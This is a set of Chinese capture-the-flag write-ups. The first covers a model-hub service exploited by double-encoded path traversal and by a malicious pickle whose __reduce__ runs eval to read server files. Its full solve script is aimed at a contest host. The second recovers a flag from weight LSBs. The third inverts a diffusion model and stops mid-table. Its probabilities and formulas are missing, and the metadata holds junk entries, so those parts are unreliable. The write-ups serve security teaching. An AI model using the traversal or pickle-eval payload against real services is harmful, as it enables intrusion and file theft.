---
title: 'MISC-Pickle-Me-Not'
contest: '强网拟态防御 第九届'
contest_normalized: '强网拟态防御 第九届'
contest_year: 2025
year: 2025
category: 'misc'
subcategory: 'misc_other'
tags: []
attack_chain:
- '解题思路'
- '从页面脚本定位审查接口'
- '两次解码读取隔离区 JSON'
- '用遗留重放取出非 JSON 证据'
- '静态拆开隔离检查点'
- ', (4, 32), (67, 2), False, {}'
one_liner: '题目描述：'
lesson: ''
quality: 'medium'
schema_version: 'v3.0.0-P0'
source_type: 'wechat_article'
source_url: 'https://mp.weixin.qq.com/s/iTgaxzumnH3cE4N5nH6VvQ'
last_verified: '2026-11-02'
flag_observed:
- 'flag{...}'
- 'flag{j3Hu9MYi7JquYrUCGZ1I8h70TSZebx7dm6sqQAJv}'
- 'flag{w31ghts_d0nt_l13_but_th3y_wh1sp3r}'
contest_normalized: "强网拟态"
subcategory_guess: "misc_misc"
---

MISC-Pickle-Me-Not
题目描述：
Autonomy Lab 正在准备在 ModelHub 中发布 fleet-aux-v3 的第 17 版。该模型通过了所有自动化质量门禁，但在仅权重策略下出现了一个意外对象引用后，一次遗留兼容性导入触发了隔离。
在分配的 ModelHub 信任中心工作区中审查该导入，并恢复隐藏在被隔离证据中的秘密。交接内容中包含一个受信任的参考检查点；被隔离的工件仍保留在工作区中。
不要仅为检查而在本地加载未知检查点。
'
题目附件：attachment.zip
核心思路：预览接口先解码再校验，用双重编码读出隔离票据；遗留重放直接
pickle.loads
，取出被拒绝下载的检查点后只做静态反序列化，再按诊断里的 SHA-256 计数器密钥流还原非连续字节视图。
2. 解题思路
信任中心前端把审查动作暴露成三个接口：模型清单、JSON 工件预览、带隔离票据的遗留导入重放。模型清单里的预览策略写明网关和存储各做一次 URL 解码，而路径策略插在两次解码之间。把
../
编成
%252e%252e
，第一次解码后仍是
%2e%2e
，过不了字面量
..
检查；第二次解码才进入
repository/quarantine/
。
预览只接受
.json
。票据、清单和 safetensors 索引能这样读到，隔离检查点、诊断日志和权重分片不能。重放接口要求正文以票据里的
LEGACY\n
开头，后面是 pickle。这个 worker 对 pickle 没有全局对象白名单，因此可以用一次
eval
把三份非 JSON 证据读回来。
回到本地后不调用
torch.load
。用只允许本题三个名字的
Unpickler
取出
modelhub_compat.rebuild_legacy_token
的参数：存储编号、偏移、形状、步长、路由、nonce、明文长度和 CRC。字节按步长从
data/2
抽出，与
guard.kdf_salt
以及诊断中的
mhkdf-sha256-v1
材料生成的计数器密钥流异或。CRC32 与 pickle 里的长度字段一致，明文中就是 flag。
3.1 从页面脚本定位审查接口
GET /
返回 ModelHub Trust Center 页面，脚本是
/app.js
。审查相关调用只有这些：
function
b
()
{
return
y(
`/api/v1/models`
)}
function
ee
(
e
)
{
return
y(
`/api/v1/artifacts?path=`
+
encodeURIComponent
(e))}
function
te
(
e
)
{
return
(
await
y(
`/api/v1/import-jobs/`
+
encodeURIComponent
(e))).job}
function
ne
(
e,t,n
)
{
return
y(
`/api/v1/import-jobs/`
+
encodeURIComponent
(e)+
`/replay`
,{
method
:
`POST`
,
headers
:{
"Content-Type"
:
`application/json`
},
body
:
JSON
.stringify({
ticket
:t,
pickle_b64
:n})
})}
重放对话框写明检查点跑在隔离的 2.5.1 兼容 worker 中，并且需要 quarantine ticket。上传文件会被整文件 base64 放进
pickle_b64
。
GET /api/v1/models
给出当前对象：
{
"name"
:
"fleet-aux-v3"
,
"version"
:
"17"
,
"stage"
:
"Quarantined"
,
"import_job_id"
:
"IMP-2026-0917-017"
,
"loader"
:
"torch-2.5.1/weights_only compatibility"
,
"artifact_preview"
: {
"gateway_transform"
:
"url-unquote"
,
"policy_stage"
:
"after gateway transform"
,
"storage_transform"
:
"url-unquote"
,
"request_template"
:
"/api/v1/artifacts?path={object_key}"
,
"public_namespace"
:
"repository:/public/"
,
"repository_boundary"
:
"repository:/"
}
}
工件列表里公开的是
model_card.json
、
normal_reference.pt
，受限的是
quarantine_snapshot.pt
。直接请求后两个名字会返回
json_artifact_path_rejected
，说明预览接口只打算吐 JSON。
导入任务
GET /api/v1/import-jobs/IMP-2026-0917-017
给出票据位置
repository:/quarantine/import_ticket.json
，以及时间线：2.5.1 worker 上
weights_only=true
的兼容加载发现意外 pickle global，工件被移进受限存储。
3.2 两次解码读取隔离区 JSON
预览实现先解码，再做路径策略，通过后再解码一次，最后相对
repository/public
打开。对应
business/artifacts/service.py
的
read_json
：
once = unquote(raw_path)
if
not
once.endswith(
".json"
)
or
".."
in
once
or
once.startswith(
"/"
):
raise
ArtifactProxyError(
400
,
"json_artifact_path_rejected"
)
twice = unquote(once)
target = (self.public_root / twice).resolve()
target.relative_to(self.repository_root)
return
target.read_bytes()
查询参数本身不再解码，所以线上的
path
必须是“再编码一层”的形式。
urlencode({"path": "%2e%2e/quarantine/import_ticket.json"})
发出去的是
%252e%252e%2Fquarantine%2Fimport_ticket.json
。
阶段
路径
策略结果
请求原文
%252e%252e/quarantine/import_ticket.json
尚未检查
第一次
unquote
%2e%2e/quarantine/import_ticket.json
以
.json
结尾，且不含字面量
..
第二次
unquote
../quarantine/import_ticket.json
落到
repository/quarantine/
，仍在仓库根内
这样读到票据：
{
"accepted_prefix"
:
"LEGACY\\n"
,
"import_job"
:
"IMP-2026-0917-017"
,
"required_files"
: [
"quarantine_snapshot.pt"
,
"repository_manifest.json"
,
"model.safetensors.index.json"
,
"model-00001-of-00002.safetensors"
,
"model-00002-of-00002.safetensors"
,
"import_diagnostics.ndjson"
],
"ticket"
:
"326f7c0fccd029567f7c92e1c68ec94c"
,
"worker"
:
"legacy-import-worker-2.5.1"
}
同一方式还能读到
repository_manifest.json
和
model.safetensors.index.json
。清单把
normal_reference.pt
标为 trusted，把
quarantine_snapshot.pt
标为 quarantined。索引给出三块权重，其中盐单独占一块：
{
"weight_map"
: {
"encoder.embed.weight"
:
"model-00001-of-00002.safetensors"
,
"encoder.norm.running"
:
"model-00002-of-00002.safetensors"
,
"guard.kdf_salt"
:
"model-00001-of-00002.safetensors"
}
}
import_diagnostics.ndjson
、
.pt
和
.safetensors
不以
.json
结尾，这条通道返回
json_artifact_path_rejected
。
3.3 用遗留重放取出非 JSON 证据
business/imports/service.py
的重放对每个来源 IP 限 32 次。票据必须一致。正文先按票据前缀还原，再无限制反序列化：
prefix = ticket[
"accepted_prefix"
].encode().decode(
"unicode_escape"
).encode()
if
not
blob.startswith(prefix):
raise
ImportReplayError(
400
,
"not_legacy_checkpoint"
)
result = pickle.loads(blob[len(prefix):])
JSON 里的
LEGACY\\n
经过
json.loads
后是 8 个字符
LEGACY
、反斜杠、
n
。
unicode_escape
再把它变成真正的换行，所以前缀是字节串
b"LEGACY\n"
。返回值如果是
bytes
，接口用
result_b64
原样送回，没有
repr
的 4096 字符截断。
把参考检查点直接送进去会得到
not_legacy_checkpoint
；加上前缀后又得到 “no persistent_load function was specified”。这证明 worker 确实在反序列化 pickle，而且没有替换成安全的 tensor 重建器。因此一次
GLOBAL eval
就能读取隔离目录。一次请求取回三份文件：
/app/repository/quarantine/quarantine_snapshot.pt
/app/repository/quarantine/model-00001-of-00002.safetensors
/app/repository/quarantine/import_diagnostics.ndjson
诊断里和秘密直接相关的两条是：
{
"decision"
:
"unexpected"
,
"event"
:
"pickle.global"
,
"module"
:
"modelhub_compat"
,
"name"
:
"rebuild_legacy_token"
}
{
"event"
:
"kdf.profile"
,
"profile"
:
"mhkdf-sha256-v1"
,
"block"
:
"sha256(utf8(global|route_id|nonce|storage_key|peer_salt_hex)||counter_be32)"
}
也就是密钥流第
counter
块为：
SHA256( UTF-8(global | route_id | nonce | storage_key | peer_salt_hex) || uint32be(counter) )
counter
从 0 递增。
global
用
模块.名字
。
3.4 静态拆开隔离检查点
quarantine_snapshot.pt
仍是普通 zip，不需要 PyTorch。成员为
quarantine_snapshot/data.pkl
、
byteorder
、
version
、
data/0
、
data/1
、
data/2
。
data.pkl
的顶层字典有三项：
state_dict
、
import_guard
、
format
。
format
是
modelhub-quarantine-v1
。
import_guard
不是 tensor，而是：
modelhub_compat.rebuild_legacy_token(
torch._utils._rebuild_tensor_v2(
persistent_load(("storage", torch.ByteStorage, "2", "cpu", 512)),
19, (4, 32), (67, 2), False, {}
),
"legacy-tar-bridge/quarantine-17",
"6c6f61645f736166655f323032365f31",
89,
3219885161
)
本地解码时
find_class
只放行
collections.OrderedDict
、
torch._utils._rebuild_tensor_v2
、
modelhub_compat.rebuild_legacy_token
，以及两个 storage 类型名。前两个重建函数换成只记录参数的桩，
persistent_load
只拆存储元组。任何其他全局对象都会抛出
UnpicklingError
。这样拿到的是结构，不是执行检查点里的代码。
存储
"2"
对应 zip 成员
quarantine_snapshot/data/2
，长度 512。真正被引用的不是连续切片，而是形状
(4, 32)
、步长
(67, 2)
、起点 19 的视图，共 128 字节。元素
(i, j)
的下标是：
19 + i * 67 + j * 2
后面两个参数是明文长度 89 和这段明文的 CRC32。
3.5 按 KDF 还原并核对 CRC
model-00001-of-00002.safetensors
的头部是 8 字节小端 JSON 长度。
guard.kdf_salt
的
data_offsets
为
[128, 144]
，dtype
U8
，16 字节：
69c429c475ee3c2c89aa14ae514d2c75
拼出来的 UTF-8 材料是：
modelhub_compat.rebuild_legacy_token|legacy-tar-bridge/quarantine-17|6c6f61645f736166655f323032365f31|2|69c429c475ee3c2c89aa14ae514d2c75
nonce 使用 pickle 里的十六进制字符串本身，不先解码成
load_safe_2026_1
。存储键是
"2"
。对 128 字节视图异或后取前 89 字节：
MODEL_IMPORT_REVIEW|tensor=guard.trace|flag{j3Hu9MYi7JquYrUCGZ1I8h70TSZebx7dm6sqQAJv}|END
zlib.crc32
的结果是
3219885161
（
0xbfeb8c69
），与 pickle 中的
LONG1
参数相同。长度、CRC 和可读帧头互相印证，因此这 89 字节就是密封明文。
4. 完整解题脚本
脚本只使用 Python 3.10+ 标准库。它从实例读取票据和三份证据，再用白名单反序列化与计数器密钥流计算明文，不调用
torch.load
。
#!/usr/bin/env python3
"""Recover the secret sealed inside the quarantined fleet-aux-v3 checkpoint.
The checkpoint is never passed to torch.load. Its pickle is decoded with a
class allowlist, and the sealed byte view is decrypted with the KDF recorded
in the quarantine diagnostics.
"""
import
argparse
import
base64
import
hashlib
import
io
import
json
import
pickle
import
socket
import
struct
import
zipfile
import
zlib
from
urllib.parse
import
urlencode
from
urllib.request
import
Request, urlopen
DEFAULT_HOST =
"l9wcpbcm.nestctf.cyberpeace.cn"
DEFAULT_PORT =
58080
def
resolve_ipv4
(host: str)
-> str:
"""Return a routable A record. A local proxy may answer with 198.18.0.0/15."""
ip = socket.getaddrinfo(host,
None
, socket.AF_INET)[
0
][
4
][
0
]
if
not
ip.startswith(
"198.18."
):
return
ip
req = Request(
f"https://cloudflare-dns.com/dns-query?name=
{host}
&type=A"
,
headers={
"accept"
:
"application/dns-json"
},
)
answer = json.load(urlopen(req, timeout=
15
))
for
item
in
answer.get(
"Answer"
, []):
if
item.get(
"type"
) ==
1
:
return
item[
"data"
]
raise
RuntimeError(
f"no public A record for
{host}
"
)
def
http
(ip: str, host: str, port: int, method: str, path: str, body: bytes | None = None)
-> bytes:
header = {
"Host"
:
f"
{host}
:
{port}
"
,
"User-Agent"
:
"modelhub-review"
,
"Accept"
:
"*/*"
,
"Connection"
:
"close"
,
}
data = body
or
b""
if
data:
header[
"Content-Type"
] =
"application/json"
header[
"Content-Length"
] = str(len(data))
raw =
f"
{method}
{path}
HTTP/1.1\r\n"
raw +=
""
.join(
f"
{k}
:
{v}
\r\n"
for
k, v
in
header.items()) +
"\r\n"
sock = socket.create_connection((ip, port),
20
)
try
:
sock.sendall(raw.encode() + data)
buf =
b""
while
True
:
chunk = sock.recv(
1
<<
20
)
if
not
chunk:
break
buf += chunk
finally
:
sock.close()
head, _, payload = buf.partition(
b"\r\n\r\n"
)
status = int(head.split()[
1
])
if
status !=
200
:
raise
RuntimeError(
f"
{method}
{path}
->
{status}
{payload[:
300
]!r}
"
)
return
payload
def
artifact
(ip: str, host: str, port: int, encoded_path: str)
-> bytes:
"""Send a path that is still percent-encoded after the gateway's first unquote."""
query = urlencode({
"path"
: encoded_path})
return
http(ip, host, port,
"GET"
,
"/api/v1/artifacts?"
+ query)
def
read_quarantine
(ip: str, host: str, port: int, job: str, ticket: str, prefix: bytes)
-> dict:
"""The legacy worker unpickles the uploaded body. Read the sealed files through it."""
names = {
"checkpoint"
:
"/app/repository/quarantine/quarantine_snapshot.pt"
,
"shard"
:
"/app/repository/quarantine/model-00001-of-00002.safetensors"
,
"diagnostics"
:
"/app/repository/quarantine/import_diagnostics.ndjson"
,
}
expr = (
"__import__('json').dumps({k: __import__('base64').b64encode(open(v,'rb').read()).decode() "
f"for k, v in
{names!r}
.items()}}).encode()"
)
class
ReadFiles
:
def
__reduce__
(self)
:
return
(eval, (expr,))
blob = prefix + pickle.dumps(ReadFiles(), protocol=
2
)
request = json.dumps({
"ticket"
: ticket,
"pickle_b64"
: base64.b64encode(blob).decode(),
}).encode()
payload = json.loads(http(
ip, host, port,
"POST"
,
f"/api/v1/import-jobs/
{job}
/replay"
,
request,
))
packed = json.loads(base64.b64decode(payload[
"result_b64"
]))
return
{key: base64.b64decode(value)
for
key, value
in
packed.items()}
class
GuardCapture
:
def
__init__
(self)
:
self.call =
None
def
tensor
(self, storage, offset, size, stride, requires_grad, hooks)
:
return
{
"storage"
: storage,
"offset"
: offset,
"size"
: tuple(size),
"stride"
: tuple(stride),
}
def
token
(self, tensor, route, nonce, length, crc)
:
self.call = {
"tensor"
: tensor,
"route"
: route,
"nonce"
: nonce,
"length"
: length,
"crc"
: crc,
}
return
self.call
class
SafeUnpickler
(pickle.Unpickler)
:
"""Decode the checkpoint structure without resolving unknown globals."""
def
__init__
(self, data: bytes, capture: GuardCapture)
:
super().__init__(io.BytesIO(data))
self.capture = capture
def
find_class
(self, module, name)
:
if
(module, name) == (
"collections"
,
"OrderedDict"
):
return
dict
if
(module, name) == (
"torch._utils"
,
"_rebuild_tensor_v2"
):
return
self.capture.tensor
if
(module, name) == (
"modelhub_compat"
,
"rebuild_legacy_token"
):
return
self.capture.token
if
module ==
"torch"
and
name
in
{
"FloatStorage"
,
"ByteStorage"
}:
return
name
raise
pickle.UnpicklingError(
f"refusing global
{module}
.
{name}
"
)
def
persistent_load
(self, pid)
:
kind, storage_type, key, location, size = pid
return
{
"kind"
: kind,
"type"
: storage_type,
"key"
: key,
"location"
: location,
"size"
: size,
}
def
strided_bytes
(storage: bytes, offset: int, size: tuple[int, int], stride: tuple[int, int])
-> bytes:
rows, cols = size
row_stride, col_stride = stride
return
bytes(
storage[offset + row * row_stride + col * col_stride]
for
row
in
range(rows)
for
col
in
range(cols)
)
def
keystream
(material: str, nbytes: int)
-> bytes:
out =
b""
counter =
0
while
len(out) < nbytes:
block = hashlib.sha256(material.encode() + counter.to_bytes(
4
,
"big"
)).digest()
out += block
counter +=
1
return
out[:nbytes]
def
safetensors_tensor
(blob: bytes, name: str)
-> bytes:
header_len = struct.unpack_from(
"<Q"
, blob)[
0
]
header = json.loads(blob[
8
:
8
+ header_len])
start, end = header[name][
"data_offsets"
]
return
blob[
8
+ header_len + start:
8
+ header_len + end]
def
main
()
->
None
:
parser = argparse.ArgumentParser()
parser.add_argument(
"--host"
, default=DEFAULT_HOST)
parser.add_argument(
"--port"
, type=int, default=DEFAULT_PORT)
parser.add_argument(
"--ip"
, default=
""
)
args = parser.parse_args()
ip = args.ip
or
resolve_ipv4(args.host)
print(
f"target
{args.host}
:
{args.port}
->
{ip}
"
)
models = json.loads(http(ip, args.host, args.port,
"GET"
,
"/api/v1/models"
))
model = models[
"models"
][
0
]
job = model[
"import_job_id"
]
preview = model[
"artifact_preview"
]
print(
f"model
{model[
'name'
]}
v
{model[
'version'
]}
job
{job}
stage
{model[
'stage'
]}
"
)
print(
"preview policy:"
,
preview[
"gateway_transform"
],
"then"
,
preview[
"policy_stage"
],
"then"
,
preview[
"storage_transform"
],
)
# One unquote leaves "%2e%2e/..." so the ".json" and ".." checks pass.
# The storage unquote then resolves the quarantine object.
ticket_doc = json.loads(artifact(
ip, args.host, args.port,
"%2e%2e/quarantine/import_ticket.json"
))
print(
"ticket"
, ticket_doc[
"ticket"
])
print(
"accepted_prefix"
, ticket_doc[
"accepted_prefix"
])
prefix = ticket_doc[
"accepted_prefix"
].encode().decode(
"unicode_escape"
).encode()
files = read_quarantine(ip, args.host, args.port, job, ticket_doc[
"ticket"
], prefix)
diagnostics = [
json.loads(line)
for
line
in
files[
"diagnostics"
].decode().splitlines()
if
line.strip()
]
kdf = next(item
for
item
in
diagnostics
if
item[
"event"
] ==
"kdf.profile"
)
guard = next(item
for
item
in
diagnostics
if
item[
"event"
] ==
"pickle.global"
)
print(
"kdf"
, kdf[
"profile"
], kdf[
"block"
])
print(
"unexpected global"
,
f"
{guard[
'module'
]}
.
{guard[
'name'
]}
"
)
archive = zipfile.ZipFile(io.BytesIO(files[
"checkpoint"
]))
capture = GuardCapture()
loaded = SafeUnpickler(archive.read(
"quarantine_snapshot/data.pkl"
), capture).load()
call = capture.call
storage_key = call[
"tensor"
][
"storage"
][
"key"
]
storage = archive.read(
f"quarantine_snapshot/data/
{storage_key}
"
)
view = strided_bytes(storage, call[
"tensor"
][
"offset"
], call[
"tensor"
][
"size"
], call[
"tensor"
][
"stride"
])
salt = safetensors_tensor(files[
"shard"
],
"guard.kdf_salt"
)
material =
"|"
.join([
f"
{guard[
'module'
]}
.
{guard[
'name'
]}
"
,
call[
"route"
],
call[
"nonce"
],
storage_key,
salt.hex(),
])
plain = bytes(a ^ b
for
a, b
in
zip(view, keystream(material, len(view))))
message = plain[:call[
"length"
]]
digest = zlib.crc32(message) &
0xFFFFFFFF
print(
"format"
, loaded[
"format"
])
print(
"view"
, call[
"tensor"
][
"offset"
], call[
"tensor"
][
"size"
], call[
"tensor"
][
"stride"
])
print(
"crc"
, digest,
"expected"
, call[
"crc"
],
"match"
, digest == call[
"crc"
])
print(message.decode())
if
__name__ ==
"__main__"
:
main()
SilentWeights
题目描述：
我们在一次渗透测试中截获了一个神经网络模型。初步分析显示它完全正常:在测试集上准确率 100%,前向推理和权重分布都没有任何可疑行为。但情报部门的情报指出:该模型文件其中一定包含了间谍活动信息。
附件：3d3dbc88a35546a7b74c7eeb1bdfa6b6.zip
核心思路：模型前向完全正常，秘密不在神经元是否激活，而在全部 float32 权重的最低位。按存储顺序取出 bit 0，再用
packbits
拼成字节，就能读出 flag。
1. 题目说明
渗透测试中截获一个神经网络模型。初步分析它完全正常：测试集准确率 100%，前向推理和权重分布都没有可疑行为。情报指出模型文件里一定包含间谍活动信息。
附件目录
silentweights
包含：
model.py
：三层全连接网络
TinyNet
，结构是
16 → 64 → 32 → 10
，两层 ReLU。
load_model
用
torch.load(..., weights_only=True)
读取状态字典。
evaluate.py
：用
test.npz
里的
X
、
y
计算准确率。
model.pt
：权重文件。
test.npz
：2000 条 16 维测试样本，标签 0 到 9。
requirements.txt
：
torch>=2.0
、
numpy>=1.24
。
题目没有给出远程服务。秘密在
model.pt
里，测试集只用来确认模型行为正常。
2. 解题思路
model.pt
是 PyTorch 的 zip 包，
data.pkl
只重建标准
FloatStorage
，没有自定义全局对象。六个存储按顺序对应
fc1.weight
、
fc1.bias
、
fc2.weight
、
fc2.bias
、
fc3.weight
、
fc3.bias
。
用 NumPy 做同样的前向后，2000 条样本全部正确。没有任何神经元在测试集上恒为 0，权重幅度也都落在正常的小范围里，文件中也没有明文字符串
flag
。因此信息不是死神经元，也不是额外文件。
float32 的最低位只改变约 (2^{-23}) 的相对幅度，不足以影响 argmax，分布图也看不出来。把全部参数按存储顺序的 bit 0 取出，每 8 位按高位在前打成一个字节，字节流中出现完整 flag。
3. 解题过程
3.1 静态读出权重，并确认推理正常
model.pt
以
PK
开头。和参数有关的成员是：
存储
字节数
float 数
状态字典键
形状
model/data/0
4096
1024
fc1.weight
(64, 16)
model/data/1
256
64
fc1.bias
(64,)
model/data/2
8192
2048
fc2.weight
(32, 64)
model/data/3
128
32
fc2.bias
(32,)
model/data/4
1280
320
fc3.weight
(10, 32)
model/data/5
40
10
fc3.bias
(10,)
data.pkl
里这些张量的
storage_offset
都是 0，步长是行主序，字节序是 little。因此直接把每个存储按
<f4
读出来即可，不必调用
torch.load
。
test.npz
的
X
形状是
(2000, 16)
，数值大约在 ([-7.22, 7.53])。按
model.py
的定义计算：
h1 = relu(X @ W1.T + b1)
h2 = relu(h1 @ W2.T + b2)
pred = argmax(h2 @ W3.T + b3)
结果是 2000/2000，准确率 100%。
h1
、
h2
的每一列都至少激活过一次，所以不存在“整颗神经元被 ReLU 永久关掉、权重可以随意改写”的通道。六组参数里也没有精确的 0，绝对值中位数大约在 0.13 到 0.20，没有超出 1 的离群权重。原始 zip 里能看到的可打印字符串只是
fc1.weight
、
FloatStorage
这类格式字段。
3.2 从最低位拼出明文
每个 float32 的 bit 0 是尾数的最低位。一共 3498 个参数，其中 1722 个该位为 1，比例接近一半，单看统计不像一段明文。把这些位按上面的存储顺序拼接，再用 NumPy 默认的
packbits
打包：每 8 个位组成一个字节，先出现的位是该字节的最高位。
得到的字节流在偏移 138 处是：
flag{w31ghts_d0nt_l13_but_th3y_wh1sp3r}
138 字节等于 1104 位，落在
fc2.weight
的前部，后面的位继续覆盖后续参数。只改 bit 0 时，数值变化远小于这些权重本身的量级，所以准确率和整体分布都保持原样。更高的位平面没有再出现
flag{...}
。
4. 完整解题脚本
依赖 NumPy。脚本从
model.pt
的六个存储恢复权重，复现测试集准确率，再从最低位抽出 flag。
#!/usr/bin/env python3
"""Extract the message hidden in the least significant bits of silentweights/model.pt."""
import
argparse
import
re
import
zipfile
from
pathlib
import
Path
import
numpy
as
np
DEFAULT_DIR = Path(
r"C:\Users\34645\Downloads\3d3dbc88a35546a7b74c7eeb1bdfa6b6\attachments\silentweights"
)
STORAGES = [
(
"model/data/0"
, (
64
,
16
)),
# fc1.weight
(
"model/data/1"
, (
64
,)),
# fc1.bias
(
"model/data/2"
, (
32
,
64
)),
# fc2.weight
(
"model/data/3"
, (
32
,)),
# fc2.bias
(
"model/data/4"
, (
10
,
32
)),
# fc3.weight
(
"model/data/5"
, (
10
,)),
# fc3.bias
]
def
load_state
(model_path: Path)
-> list[np.ndarray]:
with
zipfile.ZipFile(model_path)
as
archive:
weights = []
for
name, shape
in
STORAGES:
values = np.frombuffer(archive.read(name), dtype=
"<f4"
).reshape(shape).copy()
weights.append(values)
return
weights
def
relu
(values: np.ndarray)
-> np.ndarray:
return
np.maximum(values,
0
)
def
accuracy
(weights: list[np.ndarray], test_path: Path)
-> tuple[int, int]:
weight1, bias1, weight2, bias2, weight3, bias3 = weights
data = np.load(test_path)
inputs = data[
"X"
].astype(np.float32)
labels = data[
"y"
]
hidden1 = relu(inputs @ weight1.T + bias1)
hidden2 = relu(hidden1 @ weight2.T + bias2)
prediction = (hidden2 @ weight3.T + bias3).argmax(axis=
1
)
correct = int((prediction == labels).sum())
return
correct, len(labels)
def
extract_lsb_message
(weights: list[np.ndarray])
-> tuple[int, bytes]:
bits = np.concatenate([(item.ravel().view(np.uint32) &
1
)
for
item
in
weights]).astype(np.uint8)
packed = np.packbits(bits).tobytes()
match = re.search(r
b"flag\{[^}]+\}"
, packed)
if
match
is
None
:
raise
RuntimeError(
"flag not found in LSB stream"
)
return
match.start(), match.group()
def
main
()
->
None
:
parser = argparse.ArgumentParser()
parser.add_argument(
"--dir"
, type=Path, default=DEFAULT_DIR)
args = parser.parse_args()
weights = load_state(args.dir /
"model.pt"
)
correct, total = accuracy(weights, args.dir /
"test.npz"
)
offset, flag = extract_lsb_message(weights)
print(
f"accuracy:
{correct / total:
.2
%}
(
{correct}
/
{total}
)"
)
print(
f"lsb flag offset:
{offset}
"
)
print(flag.decode())
if
__name__ ==
"__main__"
:
main()
uae
情报部门在某次间谍活动中截获一张能让分类器误判的对抗样本 x_adv。据情报，攻击者使用基于扩散模型的 UAE 攻击工具链，并把接头暗号编码在了生成该图的初始噪声里，找出它。
附件：
uae.zip
核心思路：通过分析 CIFAR-10 ResNet-18 分类器对对抗样本的置信度锁定导引攻击目标类别（
cat
），利用基于不动点迭代的确定性扩散模型精确逆算子（
invert_fixedpoint
）将截获的对抗样本
沿 DDIM 轨迹严格反演回初始隐空间噪声
；随后利用已知随机种子重构高斯载波与逐像素调制掩码，剥离载波并在
块内完成解调与均值判决，最终重建
的 QR v2-H 二维码并识别出接头暗号。
附件目录包含以下核心材料与配置文件：
**
x_adv.npy
**：截获的对抗样本原始矩阵，数据类型为
float32
，尺寸为
，数值范围归一化在
（有效图像区间处于
附近）。目视图像
car.png
显示为一辆小型汽车。
**
classifier.pt
与
classifier.py
**：目标分类器模型权重与网络结构，为适配 CIFAR-10（输入为
）修改首层卷积与均值方差归一化层的 ResNet-18。
**
config.json
**：攻击者攻击时所使用的完整超参数配置文件，全文如下：
{
"model_id"
:
"google/ddpm-cifar10-32"
,
"sampler"
:
"guided-ddim (eta=0)"
,
"steps"
:
1000
,
"guidance"
: {
"type"
:
"x0_logprob"
,
"scale"
:
3.0
,
"formula"
:
"eps_hat = eps_theta - s*sqrt(1-ab_t)*grad_x log f_y(x0_pred)"
},
"evidence"
:
"x_adv.npy = float32 [-1,1] 原始数据（取证镜像）；x_adv.png 仅供目视"
,
"noise_scheme"
: {
"carrier_seed"
:
555
,
"mask_seed"
:
20261012
,
"layout"
:
"x_T = G + P; G=Gaussian(seed), P=masked QR payload; QR v2-H 25x25, module(r,c) -> 2x2 block at LOCS[r*25+c] (row-major, 256 blocks/ch0, 256/ch1, 113/ch2); dark=-amp, light=+amp, amp=0.65, structural x1.25; per-pixel ±1 mask(seed) 逐像素调制"
},
"classes"
: [
"airplane"
,
"automobile"
,
"bird"
,
"cat"
,
"deer"
,
"dog"
,
"frog"
,
"horse"
,
"ship"
,
"truck"
]
}
**
sampler.py
**：给出了攻击工具链中
GuidedDDIM
的生成与反演采样器实现。其核心方程支持由
生成
以及由
逆向反演回
。
2. 解题思路
整体解题流程分为“目标探测 → 轨迹反演 → 载波剥离 → 掩码解调 → 条码识别”五个阶段：
探测对抗攻击导引目标
：将
输入分类器，获取其对 CIFAR-10 各类别的对数概率输出，确认导引目标类别（
target
）。
DDIM 精确不动点逆向反演
：根据
config.json
中的
guided-ddim (eta=0)
及导引公式，利用
sampler.py
中基于不动点迭代的反演算法
invert_fixedpoint
，将对抗图像
沿扩散反向过程无损回推至时间步
，恢复初始潜在总噪声
。
高斯载波消去与残差分离
：针对
carrier_seed=555
，测试常见随机数生成引擎，利用 Channel 2 后半段（未填充 QR 载荷区域）的零方差特性锁定正确的载波序列
，计算差分载荷
。
逐像素掩码解调与块聚合
：针对
mask_seed=20261012
生成解调掩码
，计算解调信号
。对每个
空间块取均值聚合，消除逆向轨迹上的浮点微小扰动。
QR 模块二值化与条码解析
：依据行优先布局映射重构出
的 QR v2-H 矩阵，按符号判决深色/浅色模块并生成带静区边框的二维码图像，识别出接头暗号。
3. 解题过程
3.1 分类器置信度探测与导引类别锁定
关键观察：
题目描述指出攻击者使用基于扩散模型的非限制性对抗样本（UAE）工具链生成了一张能让分类器误判的汽车图像。在
config.json
中配置了分类器导引机制：
但配置项中未显式注明
target
索引。
原理与操作：
载入
classifier.pt
权重并评估输入
的 Softmax 概率分布与 Log-Softmax 输出：
x = torch.from_numpy(np.load(
'x_adv.npy'
)).unsqueeze(
0
)
logits = clf(x)
probs = torch.softmax(logits, dim=
-1
)[
0
]
for
i, name
in
enumerate(classes):
print(
f'
{i}
:
{name:
12
s}
prob=
{probs[i]:
.4
f}
, logp=
{torch.log(probs[i]):
.4
f}
'
)
本步结果：
模型对输入图像的预测输出如下：
类别 0 (
airplane
):
类别 1 (
automobile
):
类别 2 (
bird
):
**类别 3 (
cat
):
**（对数概率
）
类别 4 (
deer
):
类别 5 (
dog
):
类别 6 (
frog
):
类别 7 (
horse
):
类别 8 (
ship
):
类别 9 (
truck
):
视觉上为汽车（
automobile
）的样本以绝对优势（
）被误判为猫（
cat
）。导引目标类别确认为：
3.2 确定性 DDIM 轨迹的不动点逆向反演
关键观察：
sampler.py
中实现了单步确定性 DDIM 生成过程：
若记
，
，则单步前向关系为
。传统 DDIM 反演直接将
近似为
，会导致误差沿时间步单向累积。
原理与操作：
sampler.py
给出了基于不动点迭代的精确逆向反演算子
invert_fixedpoint
：
由于相邻时间步间
，该映射为高收敛率的压缩映射，迭代
次即可使每步反演误差降低到
量级。
加载基座扩散模型
google/ddpm-cifar10-32
与分类器，冻结其参数以加速反向求导计算图。以
steps=100
（或
steps=1000
）及
执行逆向轨迹推导：
sampler = GuidedDDIM(unet, sched, device=
'cpu'
, steps=
100
)
guidance = {
'clf'
: clf,
'target'
:
3
,
'scale'
:
3.0
}
x_T = sampler.invert_fixedpoint(x_adv, guidance=guidance, iters=
3
)
本步结果：
在 CPU 多线程环境下，反演过程耗时约 150 秒完成，获得初始潜在张量
，其整体均值为
，标准差为
，完全符合加噪高斯空间的统计分布特征。
3.3 高斯载波匹配与差分残差分离
关键观察：
config.json
说明初始噪声由高斯载波与隐写载荷叠加而成：
其中
。QR v2-H 规格为
模块，每个模块对应一个
的像素块。 在
图像中，单通道包含
个
空间块。
Channel 0 容纳 256 块（对应模块
）
Channel 1 容纳 256 块（对应模块
）
Channel 2 容纳
块（对应模块
）
因此，**Channel 2 中块索引
（共 143 个块，即 572 个像素）完全没有载荷注入，理论上满足
，即
**。
原理与操作：
对比 Python 中不同的高斯随机数生成实现，检查 Channel 2 剩余 143 个块处差分
的统计方差：
候选生成方式
Channel 2 闲置块残差标准差
Channel 2 载荷块残差标准差
结论
torch.randn(seed=555)
1.4250
1.4705
伪随机序列不匹配
np.random.seed(555)
